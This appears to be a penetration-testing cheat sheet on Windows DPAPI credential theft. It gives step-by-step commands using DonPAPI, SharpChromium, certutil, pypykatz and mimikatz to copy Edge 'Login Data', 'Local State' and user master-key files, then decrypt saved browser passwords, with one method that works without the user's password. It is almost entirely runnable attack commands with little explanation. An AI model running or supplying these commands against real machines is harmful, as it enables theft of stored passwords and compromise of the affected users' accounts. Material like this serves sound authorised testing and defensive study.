---
title: "DPAPI"
date: 2024-7-31
tags: ["DPAPI", "enum", "Windows", "password", "credentials", "DonPAPI"]
---

---
### Auto dump all (From Linux)

[DonPAPI](https://github.com/login-securite/DonPAPI)

```bash
DonPAPI collect -d <DOMAIN> -u <USERNAME> -p <PASSWORD> -t <TARGET>
```

### Browser Saved Creds

#### Auto

[SharpChromium.exe](https://github.com/Flangvik/SharpCollection/blob/master/NetFramework_4.5_Any/SharpChromium.exe)

```powershell
.\SharpChromium.exe logins
```

#### Manual (e.g. Edge)

```powershell
# Get Local State json file, copy and paste to local Linux
type "C:\Users\[USER]\appdata\local\microsoft\edge\User Data\Local State"
```

```powershell
# Get Login Data binary file
certutil -encode "C:\Users\[USER]\appdata\local\microsoft\edge\User Data\Default\Login Data" C:\Windows\Tasks\logindata
```

```powershell
# Copy and paste to local Linux
type C:\Windows\Tasks\logindata
```

```bash
# Base64 decode
cat logindata_b64 | base64 -d > logindata
```

```bash
# Extract key from local state
cat localstate | jq -r .os_crypt.encrypted_key | base64 -d | cut -c6- > blob
```

[pypykatz](https://github.com/skelsec/pypykatz)

```bash
# Get masterkey_guid
pypykatz dpapi describe blob blob
```

#### 2. Retrieve Keys

```powershell
# Get master key
certutil -encode "C:\Users\[USER]\AppData\Roaming\Microsoft\Protect\[SID]\[masterkey_guid]" C:\Windows\Tasks\[masterkey_guid]
```

```powershell
# Copy and paste to local Linux
type C:\Windows\Tasks\[masterkey_guid]
```

```bash
# Base64 decode
cat masterkey_guid_b64 | base64 -d > masterkey_guid
```

#### 3. Decrypt

```bash
pypykatz dpapi prekey password <SID> <USER_PASSWORD> | tee pkf
```

```bash
pypykatz dpapi masterkey <masterkey_guid_file> pkf -o mkf
```

```bash
pypykatz dpapi chrome --logindata logindata mkf localstate
```

### Decrpyt Masterkey without password

```powershell
# Take note: Last key
.\mimikatz.exe "dpapi::masterkey /in:C:\users\[USER]\appdata\roaming\microsoft\protect\[SID]\[masterkey_guid] /rpc" exit
```

```powershell
# Decrypt
.\mimikatz.exe "dpapi::cred /in:C:\users\[USER]\appdata\roaming\microsoft\protect\[SID]\[masterkey_guid] /masterkey:<KEY>" exit
```

<br>